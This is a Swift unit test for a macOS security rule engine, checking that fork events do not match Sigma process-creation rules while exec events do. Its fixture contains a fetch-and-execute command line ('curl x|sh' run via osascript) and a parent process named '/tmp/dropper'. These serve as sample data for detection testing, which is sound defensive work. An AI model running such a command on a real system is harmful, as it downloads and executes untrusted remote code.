import Foundation
import Testing
@testable import MacCrabCore

/// Sigma's process_creation is an exec. A fork child still runs its parent's
/// image with an empty command line and must not be evaluated as one.
@Suite("Fork events are not process creations")
struct ForkEventRuleEvaluationTests {
    private func event(action: String) -> Event {
        let process = MacCrabCore.ProcessInfo(
            pid: 6100, ppid: 6000, rpid: 6000, name: "osascript", executable: "/usr/bin/osascript",
            commandLine: action == "fork" ? "" : "osascript -e 'do shell script \"curl x|sh\"'",
            args: [], workingDirectory: "/tmp", userId: 501, userName: "u", groupId: 20,
            startTime: Date(), codeSignature: CodeSignatureInfo(signerType: .apple),
            ancestors: [ProcessAncestor(pid: 6000, executable: "/tmp/dropper", name: "dropper")],
            isPlatformBinary: true)
        return Event(eventCategory: .process, eventType: .start, eventAction: action, process: process)
    }

    @Test("an image-only process rule matches the exec, never the fork")
    func forkDoesNotMatchProcessCreationRules() async throws {
        let directory = FileManager.default.temporaryDirectory
            .appendingPathComponent("maccrab-fork-rule-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: false)
        defer { try? FileManager.default.removeItem(at: directory) }
        let rule = CompiledRule(
            id: "test.osascript-image", title: "osascript image", description: "",
            level: .high, tags: [], logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [Predicate(field: "Image", modifier: .endswith, values: ["/osascript"], negate: false)],
            condition: .allOf, falsepositives: [], enabled: true)
        try JSONEncoder().encode(rule).write(to: directory.appendingPathComponent("rule.json"))
        let engine = RuleEngine()
        #expect(try await engine.loadRules(from: directory) == 1)
        #expect(await engine.evaluate(event(action: "exec")).contains { $0.ruleId == "test.osascript-image" })
        #expect(await engine.evaluate(event(action: "fork")).isEmpty)
    }
}
